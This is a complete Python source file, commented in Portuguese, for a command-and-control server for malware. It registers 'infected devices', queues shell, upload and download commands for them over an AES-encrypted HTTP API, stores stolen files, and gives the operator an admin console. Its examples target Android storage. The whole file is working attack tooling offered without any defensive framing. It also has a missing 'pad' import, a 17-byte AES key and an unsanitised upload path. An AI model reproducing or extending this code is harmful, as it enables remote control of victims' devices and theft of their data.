#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import socket
import threading
import sqlite3
import json
import base64
import hashlib
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# Configurações do C2
C2_IP = "0.0.0.0"
C2_PORT = 8080
API_KEY = "SECRET-API-KEY-123456"
ENCRYPTION_KEY = b"16BYTESENCRYPTKEY"

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Servidor HTTP com suporte a threading"""

class C2Handler(BaseHTTPRequestHandler):
    """Handler para requisições C2"""
    
    def _set_headers(self, code=200):
        self.send_response(code)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
    
    def do_GET(self):
        """Lida com requisições GET"""
        if self.path == '/health':
            self._set_headers()
            self.wfile.write(json.dumps({"status": "alive"}).encode())
        else:
            self._set_headers(404)
            self.wfile.write(json.dumps({"error": "Not found"}).encode())
    
    def do_POST(self):
        """Lida com requisições POST"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            # Verifica autenticação
            if not self._authenticate():
                self._set_headers(401)
                self.wfile.write(json.dumps({"error": "Unauthorized"}).encode())
                return
            
            # Rotas da API
            if self.path == '/register':
                self._handle_register(post_data)
            elif self.path == '/command':
                self._handle_command(post_data)
            elif self.path == '/report':
                self._handle_report(post_data)
            elif self.path == '/upload':
                self._handle_upload(post_data)
            else:
                self._set_headers(404)
                self.wfile.write(json.dumps({"error": "Not found"}).encode())
                
        except Exception as e:
            self._set_headers(500)
            self.wfile.write(json.dumps({"error": str(e)}).encode())
    
    def _authenticate(self) -> bool:
        """Verifica a autenticação do cliente"""
        auth_header = self.headers.get('Authorization')
        if not auth_header:
            return False
        return auth_header == f"Bearer {API_KEY}"
    
    def _decrypt_data(self, data: bytes) -> dict:
        """Descriptografa dados recebidos"""
        try:
            iv = data[:16]
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
            decrypted = unpad(cipher.decrypt(data[16:]), AES.block_size)
            return json.loads(decrypted.decode())
        except Exception as e:
            raise ValueError(f"Decryption failed: {str(e)}")
    
    def _encrypt_data(self, data: dict) -> bytes:
        """Criptografa dados para envio"""
        data_str = json.dumps(data)
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data_str.encode(), AES.block_size))
        return cipher.iv + ct_bytes
    
    def _handle_register(self, data: bytes):
        """Registra um novo dispositivo infectado"""
        decrypted = self._decrypt_data(data)
        device_id = decrypted.get('device_id')
        device_info = decrypted.get('device_info')
        
        with Database() as db:
            db.register_device(device_id, device_info)
        
        self._set_headers()
        response = {"status": "registered", "next_checkin": 300}
        self.wfile.write(self._encrypt_data(response))
    
    def _handle_command(self, data: bytes):
        """Envia comandos para o dispositivo"""
        decrypted = self._decrypt_data(data)
        device_id = decrypted.get('device_id')
        
        with Database() as db:
            command = db.get_pending_command(device_id)
        
        if command:
            self._set_headers()
            response = {
                "command": command['command'],
                "args": command['args'],
                "command_id": command['id']
            }
            self.wfile.write(self._encrypt_data(response))
            
            # Marca comando como enviado
            with Database() as db:
                db.update_command_status(command['id'], 'sent')
        else:
            self._set_headers()
            self.wfile.write(self._encrypt_data({"status": "no_command"}))
    
    def _handle_report(self, data: bytes):
        """Recebe relatórios dos dispositivos"""
        decrypted = self._decrypt_data(data)
        device_id = decrypted.get('device_id')
        command_id = decrypted.get('command_id')
        output = decrypted.get('output')
        
        with Database() as db:
            db.save_command_output(command_id, output)
            db.update_command_status(command_id, 'executed')
        
        self._set_headers()
        self.wfile.write(self._encrypt_data({"status": "received"}))
    
    def _handle_upload(self, data: bytes):
        """Recebe uploads de arquivos dos dispositivos"""
        decrypted = self._decrypt_data(data)
        device_id = decrypted.get('device_id')
        filename = decrypted.get('filename')
        file_data = base64.b64decode(decrypted.get('file_data'))
        
        # Cria diretório para o dispositivo
        os.makedirs(f"uploads/{device_id}", exist_ok=True)
        
        # Salva arquivo
        with open(f"uploads/{device_id}/{filename}", 'wb') as f:
            f.write(file_data)
        
        self._set_headers()
        self.wfile.write(self._encrypt_data({"status": "uploaded"}))
    
    def log_message(self, format, *args):
        """Customiza logging para incluir timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"{timestamp} - {self.address_string()} - {format % args}"
        print(message)

class Database:
    """Classe para manipulação do banco de dados"""
    
    def __init__(self):
        self.conn = sqlite3.connect('c2_database.db')
        self._init_db()
    
    def __enter__(self):
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.conn.close()
    
    def _init_db(self):
        """Inicializa o banco de dados"""
        cursor = self.conn.cursor()
        
        # Tabela de dispositivos
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS devices (
            id TEXT PRIMARY KEY,
            info TEXT,
            first_seen TEXT,
            last_seen TEXT,
            online INTEGER DEFAULT 0
        )
        ''')
        
        # Tabela de comandos
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            command TEXT,
            args TEXT,
            status TEXT,
            created_at TEXT,
            executed_at TEXT,
            output TEXT,
            FOREIGN KEY(device_id) REFERENCES devices(id)
        )
        ''')
        
        # Tabela de arquivos
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            filename TEXT,
            path TEXT,
            uploaded_at TEXT,
            FOREIGN KEY(device_id) REFERENCES devices(id)
        )
        ''')
        
        self.conn.commit()
    
    def register_device(self, device_id: str, device_info: str):
        """Registra ou atualiza um dispositivo"""
        cursor = self.conn.cursor()
        now = datetime.now().isoformat()
        
        # Verifica se já existe
        cursor.execute('SELECT id FROM devices WHERE id = ?', (device_id,))
        if cursor.fetchone():
            cursor.execute('''
            UPDATE devices 
            SET info = ?, last_seen = ?, online = 1
            WHERE id = ?
            ''', (device_info, now, device_id))
        else:
            cursor.execute('''
            INSERT INTO devices (id, info, first_seen, last_seen, online)
            VALUES (?, ?, ?, ?, 1)
            ''', (device_id, device_info, now, now))
        
        self.conn.commit()
    
    def get_pending_command(self, device_id: str) -> dict:
        """Obtém o próximo comando pendente para o dispositivo"""
        cursor = self.conn.cursor()
        cursor.execute('''
        SELECT id, command, args 
        FROM commands 
        WHERE device_id = ? AND status = 'pending'
        ORDER BY created_at ASC
        LIMIT 1
        ''', (device_id,))
        
        row = cursor.fetchone()
        if row:
            return {'id': row[0], 'command': row[1], 'args': row[2]}
        return None
    
    def update_command_status(self, command_id: int, status: str):
        """Atualiza o status de um comando"""
        cursor = self.conn.cursor()
        now = datetime.now().isoformat()
        
        if status == 'executed':
            cursor.execute('''
            UPDATE commands 
            SET status = ?, executed_at = ?
            WHERE id = ?
            ''', (status, now, command_id))
        else:
            cursor.execute('''
            UPDATE commands 
            SET status = ?
            WHERE id = ?
            ''', (status, command_id))
        
        self.conn.commit()
    
    def save_command_output(self, command_id: int, output: str):
        """Salva a saída de um comando executado"""
        cursor = self.conn.cursor()
        cursor.execute('''
        UPDATE commands 
        SET output = ?
        WHERE id = ?
        ''', (output, command_id))
        self.conn.commit()
    
    def add_command(self, device_id: str, command: str, args: str = ""):
        """Adiciona um novo comando para um dispositivo"""
        cursor = self.conn.cursor()
        now = datetime.now().isoformat()
        
        cursor.execute('''
        INSERT INTO commands (device_id, command, args, status, created_at)
        VALUES (?, ?, ?, 'pending', ?)
        ''', (device_id, command, args, now))
        
        self.conn.commit()
        return cursor.lastrowid

class C2AdminCLI:
    """Interface de linha de comando para administração do C2"""
    
    def __init__(self):
        self.running = True
        self.db = Database()
    
    def run(self):
        """Inicia a interface CLI"""
        print("\n=== C2 Admin Console ===")
        print("Type 'help' for available commands\n")
        
        while self.running:
            try:
                cmd = input("C2> ").strip().lower()
                
                if cmd == 'help':
                    self._show_help()
                elif cmd == 'devices':
                    self._list_devices()
                elif cmd.startswith('command'):
                    self._handle_command(cmd)
                elif cmd.startswith('history'):
                    self._show_command_history(cmd)
                elif cmd == 'exit':
                    self.running = False
                else:
                    print("Unknown command. Type 'help' for available commands")
                    
            except KeyboardInterrupt:
                print("\nUse 'exit' to quit")
            except Exception as e:
                print(f"Error: {str(e)}")
    
    def _show_help(self):
        """Mostra ajuda dos comandos"""
        help_text = """
Available commands:
  help              - Show this help message
  devices           - List all registered devices
  command <device>  - Send command to a device
  history <device>  - Show command history for a device
  exit              - Exit the admin console

Command examples:
  command d3v1c3-1d shell "ls -la /sdcard"
  command d3v1c3-1d upload "/sdcard/secret.txt"
  history d3v1c3-1d
"""
        print(help_text)
    
    def _list_devices(self):
        """Lista todos os dispositivos registrados"""
        cursor = self.db.conn.cursor()
        cursor.execute('''
        SELECT id, info, last_seen, online 
        FROM devices 
        ORDER BY last_seen DESC
        ''')
        
        print("\nRegistered Devices:")
        print("-" * 80)
        print(f"{'ID':<20} {'Status':<10} {'Last Seen':<25} {'Info'}")
        print("-" * 80)
        
        for row in cursor.fetchall():
            status = "ONLINE" if row[3] else "OFFLINE"
            last_seen = datetime.fromisoformat(row[2]).strftime("%Y-%m-%d %H:%M:%S")
            print(f"{row[0]:<20} {status:<10} {last_seen:<25} {row[1][:50]}...")
        
        print()
    
    def _handle_command(self, cmd: str):
        """Processa comandos para dispositivos"""
        parts = cmd.split()
        if len(parts) < 3:
            print("Usage: command <device_id> <command_type> [args]")
            return
        
        device_id = parts[1]
        command_type = parts[2]
        args = " ".join(parts[3:]) if len(parts) > 3 else ""
        
        # Verifica se o dispositivo existe
        cursor = self.db.conn.cursor()
        cursor.execute('SELECT id FROM devices WHERE id = ?', (device_id,))
        if not cursor.fetchone():
            print(f"Device {device_id} not found")
            return
        
        # Tipos de comando suportados
        if command_type not in ['shell', 'upload', 'download', 'info']:
            print(f"Unknown command type: {command_type}")
            print("Supported types: shell, upload, download, info")
            return
        
        # Adiciona comando ao banco de dados
        command_id = self.db.add_command(device_id, command_type, args)
        print(f"Command queued with ID: {command_id}")
    
    def _show_command_history(self, cmd: str):
        """Mostra histórico de comandos para um dispositivo"""
        parts = cmd.split()
        if len(parts) < 2:
            print("Usage: history <device_id>")
            return
        
        device_id = parts[1]
        
        # Verifica se o dispositivo existe
        cursor = self.db.conn.cursor()
        cursor.execute('SELECT id FROM devices WHERE id = ?', (device_id,))
        if not cursor.fetchone():
            print(f"Device {device_id} not found")
            return
        
        # Obtém histórico de comandos
        cursor.execute('''
        SELECT id, command, args, status, created_at, executed_at 
        FROM commands 
        WHERE device_id = ?
        ORDER BY created_at DESC
        LIMIT 20
        ''', (device_id,))
        
        print(f"\nCommand History for {device_id}:")
        print("-" * 100)
        print(f"{'ID':<5} {'Command':<10} {'Args':<20} {'Status':<10} {'Created':<20} {'Executed':<20}")
        print("-" * 100)
        
        for row in cursor.fetchall():
            executed = row[5][:19] if row[5] else "N/A"
            print(f"{row[0]:<5} {row[1]:<10} {str(row[2])[:18]:<20} {row[3]:<10} {row[4][:19]:<20} {executed:<20}")
        
        print()

def start_c2_server():
    """Inicia o servidor C2"""
    server = ThreadedHTTPServer((C2_IP, C2_PORT), C2Handler)
    print(f"Starting C2 server on {C2_IP}:{C2_PORT}")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down C2 server")
        server.shutdown()
        server.server_close()

def main():
    """Função principal"""
    # Inicia servidor HTTP em uma thread separada
    server_thread = threading.Thread(target=start_c2_server, daemon=True)
    server_thread.start()
    
    # Inicia interface de administração
    cli = C2AdminCLI()
    cli.run()

if __name__ == '__main__':
    main()
